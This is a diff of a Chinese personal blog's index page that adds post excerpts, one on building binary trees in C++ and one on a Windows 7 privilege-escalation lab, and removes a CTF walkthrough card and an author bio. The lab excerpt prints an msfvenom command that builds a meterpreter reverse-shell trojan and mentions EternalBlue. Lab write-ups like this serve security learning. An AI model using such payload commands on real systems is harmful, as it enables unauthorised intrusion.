@@ -156,6 +156,110 @@
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/03/31/bin-tree1/">
+        <p class="h4 index-header">二叉树的创建和遍历</p>
+      </a>
+
+      <a href="/2020/03/31/bin-tree1/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">
+套路，都是套路
+
+定义在计算机科学中，二叉树（英语：Binary tree）是每个节点最多只有两个分支（即不存在分支度大于2的节点）的树结构。通常分支被称作“左子树”或“右子树”。二叉树的分支具有左右次序，不能随意颠倒
+
+关于书上的那些性质和定义我就不写了，书上说的比我好多了。
+
+结构二叉树由数据，左子树，右子树组成，在C++中，通常用如下表示：
+typedef struct node {
+    node* lf; //左子树
+    node* rt; //右子树
+    int data; //数据
+}ndoe ,*bin_tree;
+创建我们通常使用先根序创建一个二叉树
+void c</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-31&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/">数据结构与算法</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/C/">C++</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/03/29/dig3/">
+        <p class="h4 index-header">windows下提权实验</p>
+      </a>
+
+      <a href="/2020/03/29/dig3/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">
+在我们获取对方电脑权限后，我们应该做什么（不要总是想到删库）
+
+实验环境kali linux攻击机（推荐kali20.1）
+win 7 basic
+如何拿到权限面对这样一台裸露的win7，我们有很多办法能拿到权限，比如著名的EternalBlue，这样可以直接拿到系统权限。
+不过，我们还有更有意思的玩法，那就是反弹shell获取权限
+首先，生成一个windows下运行的木马程序
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe -o 要生成的文件名
+启动http服务
+python -m Sim</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-29&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/">渗透攻击实战</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>&nbsp;
+          
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a>&nbsp;
+          
+            <a href="/tags/kali/">kali</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
       <a href="/2020/03/21/linklist4/">
         <p class="h4 index-header">关于链表的一些小练习</p>
       </a>
@@ -546,90 +650,19 @@ typedef struct Node
     </div>
   </div>
 
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/03/10/hello-world/">
-        <p class="h4 index-header">攻防世界 MISC 新手村攻略</p>
-      </a>
-
-      <a href="/2020/03/10/hello-world/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">
-作为一名逆向手，MISC之前看别人做一直感觉好玩但没碰过(此前一直羡慕队里的MISC手），真正做起来感觉这玩意还是挺烧脑的，脑洞不够的我着实玩不起/xk/xk
-
-题目地址： https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0&amp;page=1
-this_is_flag签到题，flag题干直接给了
-PDF题干中提到图片下面什么都没有，所以我们把图片移走就好了，flag在下面
-这题大佬们似乎都用的PDF编辑器，我这种业余玩家是把PDF转成word来弄的，实现此功能有个靠谱的网站：https</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-10&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF%E9%A2%98%E7%9B%AE%E6%B5%AE%E7%8E%B0/">CTF题目浮现</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>&nbsp;
-          
-            <a href="/tags/MISC/">MISC</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/03/09/myself/">
-        <p class="h4 index-header">个人简介</p>
-      </a>
-
-      <a href="/2020/03/09/myself/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">
-这是我的新博客，之前的博客因为一直没更就放弃了，这次希望能坚持做下去
-
-我是谁一名末流985学校的菜鸡，计算机专业学生，软件开发爱好者，信息安全爱好者，重点方向是逆向工程。
-准备写点什么程序开发、算法、CTF、以及一些奇怪的东西。
-近期计划准备先移植一下之前在各平台发的文章之类的，会不定期更一些数据结构和信息安全内容。
-单人博客？会考虑让几个有想法的同学加入进来，做出一个优秀的IT博客，目前欢迎网络、软件开发、二进制、数学爱好者加入。
-联系方式我的邮箱：dyn201885095@gmail.com
-未来fun in everything
-</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-09&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
 
 
+  <nav aria-label="index posts navigation">
+    <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-double-right"></i></a>
+    </span>
+  </nav>
+  
+  <script>
+    for (ele of document.getElementById("pagination").getElementsByClassName("page-number")) {
+      ele.href += '#board';
+    }
+  </script>
 
 
 
